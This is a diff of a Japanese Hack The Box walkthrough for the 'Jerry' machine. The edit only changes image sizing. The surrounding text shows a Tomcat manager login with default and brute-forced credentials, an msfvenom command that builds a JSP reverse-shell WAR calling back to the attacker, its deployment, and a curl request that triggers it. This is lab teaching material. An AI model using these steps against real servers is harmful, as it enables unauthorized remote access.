@@ -40,24 +40,24 @@ Nmap done: 1 IP address (1 host up) scanned in 35.50 seconds
 
 ## STEP 2
 8080番にアクセス  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_01.png" width="100%" height="100%">
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_01.png">
 サイト右上の「manager app」をクリックするとbasic認証が要求される  
 nmapの結果から確認できるデフォルトクレデンシャルでログインできた  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_02.png" width="75%" height="75%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_02.png">  
 いちお`burp suite`でもブルートフォースをやってみる  
 basic認証を使用しているので、クレデンシャルがbase64でエンコードされてる  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_03.png" width="100%" height="100%">
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_03.png">
 burp suiteのproxyで確認できる通信を、intruderでいじる  
 「payload configuration」にリストをpasteし、「payload proccessing」の「base64-encode」で各クレデンシャルをエンコード
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_04.png" width="100%" height="100%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_04.png">  
 「start attacks」で攻撃を開始すると、httpステータスコード200のクレデンシャルを確認できる  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_05.png" width="100%" height="100%">
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_05.png">
 
 
 ## STEP 3
 「manager app」にログイン  
 warファイルをdeployできるので、war形式のペイロードをアップロードする  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_06.png" width="100%" height="100%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_06.png">  
 war形式のペイロード作成
 ```sh
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war
@@ -66,9 +66,9 @@ Final size of war file: 1088 bytes
 Saved as: shell.war
 ```
 ペイロードをデプロイ  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_07.png" width="50%" height="50%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_07.png">  
 デプロイしたペイロードが追加されていることがわかる  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_08.png" width="100%" height="100%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_08.png">  
 デプロイしたペイロードにhttpアクセスして、ペイロードを実行
 ```sh
 └─$ curl http://10.129.136.91:8080/shell/
